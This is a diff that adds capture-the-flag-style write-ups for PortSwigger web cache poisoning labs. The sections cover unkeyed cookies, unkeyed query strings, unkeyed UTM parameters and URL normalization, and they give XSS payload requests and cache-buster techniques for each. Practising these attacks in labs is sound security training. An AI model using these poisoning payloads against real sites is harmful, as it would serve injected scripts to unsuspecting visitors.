@@ -41,6 +41,50 @@ When accessing the home page we get the alert pop up:
 
 ![img](media/6bc09ef0499aeb83d680e5c6ee04b825.png)
 
+
+# Web cache poisoning with an unkeyed cookie
+
+This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
+
+
+
+![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/1.png)
+
+---------------------------------------------
+
+
+The content of the cookie “fehost” is reflected in the HTML code:
+
+
+
+![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/2.png)
+
+
+I will send the following payload:
+
+``` 
+GET / HTTP/2
+Cookie: session=OwRJHH4NdgNoL0ghzNHYgwQTFpmM6m0G; fehost=prod-cache-01"}</script><script>alert(1)</script><script>{"
+...
+``` 
+
+
+
+![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/3.png)
+
+
+When accessing the page:
+
+
+
+![img](images/Web%20cache%20poisoning%20with%20an%20unkeyed%20cookie/4.png)
+
 03 Web cache poisoning with multiple headers
 ============================================
 
@@ -211,6 +255,257 @@ X-Host: exploit-0acc00f704141c10817b1b2e011000d5.exploit-server.net
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![img](media/4133d8eb4822df1ff09623d3c3c05d6b.png)
+
+
+# Web cache poisoning via an unkeyed query string
+
+This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.
+
+To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.
+
+Hint:
+
+- If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.
+
+- Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/1.png)
+
+---------------------------------------------
+
+First I will add the header to display the cache key in the response headers:
+
+```
+GET / HTTP/2
+...
+Pragma: x-get-cache-key
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/2.png)
+
+
+Then I added headers for a cache buster:
+
+```
+GET / HTTP/2
+...
+Pragma: x-get-cache-key
+Accept-Encoding: gzip, deflate, cachebuster
+Accept: */*, text/cachebuster
+Cookie: cachebuster=1
+Origin: https://cachebuster.0a68004803664d558681b8a800650043.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/3.png)
+
+
+Whatever we add to the “Origin” header will be in X-Cache-Key, we can use it as a cache buster:
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/4.png)
+
+
+And the query is reflected in the response:
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/5.png)
+
+
+We can execute an alert(1) with:
+
+```
+GET /?evil='/><script>alert(1)</script> HTTP/2
+...
+Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/6.png)
+
+
+When “X-Cache: hit”, visit “/” and the alert(1) is still in the response:
+
+```
+GET / HTTP/2
+...
+Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/7.png)
+
+
+Send again the payload but without the “Origin” header:
+
+```
+GET /?evil='/><script>alert(1)</script> HTTP/2
+...
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/8.png)
+
+
+This will generate an alert to pop up in “/”:
+
+
+
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/9.png)
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/10.png)
+
+
+# Web cache poisoning via an unkeyed query parameter
+
+This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.
+
+To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.
+
+Hint: Websites often exclude certain UTM analytics parameters from the cache key.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/1.png)
+
+---------------------------------------------
+
+
+```
+GET / HTTP/2
+...
+Pragma: x-get-cache-key
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/2.png)
+
+
+```
+GET /test=ing123
+...
+Pragma: x-get-cache-key
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/3.png)
+
+
+Then I added headers for a cache buster and find "Origin" header is an oracle buster. We also see the query is reflected in the response:
+
+```
+GET /?test=ing123 HTTP/2
+...
+Pragma: x-get-cache-key
+Accept-Encoding: gzip, deflate, cachebuster
+Accept: */*, text/cachebuster
+Cookie: cachebuster=1
+Origin: https://cachebuster.0a4b00720459a58f800058b200dc0063.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/4.png)
+
+We could pop an alert with the payload:
+
+```
+GET /?test=ing123'/><script>alert(1)</script><link+href='/ 
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/5.png)
+
+
+However, it is not possible to cache this for an attack, because this query parameter is keyed. We must find one query parameter that is not keyed:
+
+
+
+
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/6.png)
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/7.png)
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/8.png)
+
+
+We can add this parameter and see how it is not part of the response header “X-Cache-Key”:
+
+```
+GET /?test=ing123&utm_content=testing123 HTTP/2
+...
+Pragma: x-get-cache-key
+Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/9.png)
+
+
+Then use the previous payload for this new parameter:
+
+```
+GET /?utm_content=testing123'/><script>alert(1)</script><link+href='/ HTTP/2
+...
+Pragma: x-get-cache-key
+Origin: 0a4b00720459a58f800058b200dc0063.web-security-academy.net
+```
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/10.png)
+
+
+
+Then again without the parameter, we see the same response with the alert(1):
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/11.png)
+
+
+The with the payload and without the “Origin” header:
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/12.png)
+
+
+
+And finally without the payload or the “Origin” header:
+
+
+
+![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20parameter/13.png)
 
 07 Parameter cloaking
 =====================
@@ -389,3 +684,108 @@ And check with a regular GET request without the “Origin” header:
 Then access “/” and the request to this endpoint generates the alert message:
 
 ![img](media/2c80327e1c1382c41933c63472f95280.png)
+
+
+# URL normalization
+
+This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.
+
+To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
+
+
+
+![img](images/URL%20normalization/1.png)
+
+---------------------------------------------
+
+We can find the “Origin” header can work as oracle and random query parameters are keyed:
+
+```
+GET /?test=ing123 HTTP/2
+...
+Pragma: x-get-cache-key
+Accept-Encoding: gzip, deflate, cachebuster
+Accept: */*, text/cachebuster
+Cookie: cachebuster=1
+Origin: cachebuster.0ad0007f043013aa819c0d3d003a00ce.web-security-academy.net
+```
+
+
+
+![img](images/URL%20normalization/2.png)
+
+
+There is a reflected XSS when the page is not found:
+
+```
+GET /404<script>alert(1)</script>
+```
+
+
+
+![img](images/URL%20normalization/3.png)
+
+
+
+
+![img](images/URL%20normalization/4.png)
+
+
+The cache key is the same for:
+
+- /<script>alert(1)</script>
+- /%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e (URL-encode all characters)
+
+
+
+
+
+![img](images/URL%20normalization/5.png)
+![img](images/URL%20normalization/6.png)
+
+
+
+First I will send the unencoded version until hitting the cache limit and then the encoded one:
+
+
+
+![img](images/URL%20normalization/7.png)
+
+We see the correct payload:
+
+
+
+![img](images/URL%20normalization/8.png)
+
+Next, the same test without the “Origin” header:
+
+
+
+
+
+![img](images/URL%20normalization/9.png)
+![img](images/URL%20normalization/10.png)
+
+
+If we visit “/%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e”:
+
+
+
+![img](images/URL%20normalization/11.png)
+
+
+To solve the lab it is necessary to add something random before the payload:
+
+```
+GET /random<script>alert(1)</script>
+```
+
+```
+GET /random%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
+```
